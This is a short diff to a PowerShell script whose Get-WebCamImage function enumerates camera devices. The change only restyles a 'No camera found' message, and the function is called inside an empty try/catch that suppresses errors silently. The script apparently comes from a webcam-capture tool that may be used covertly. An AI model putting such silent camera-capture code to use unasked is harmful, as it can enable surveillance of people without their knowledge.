@@ -145,8 +145,7 @@ function Get-WebCamImage {
         try {
             $devices = [WebCamLib.DeviceManager]::GetAllDevices()
         } catch {
-			Write-Host "No camera found"
-			
+		Write-Host "[!] No camera found" -ForegroundColor Red		
 		}
         $count = 0
         foreach ($device in $devices) {
@@ -161,8 +160,7 @@ function Get-WebCamImage {
         }
 
     } catch {
-		Write-Host "No camera found"
-		
+	     Write-Host "[!] No camera found" -ForegroundColor Red	
 	}
 }
 try {Get-WebCamImage} catch {}
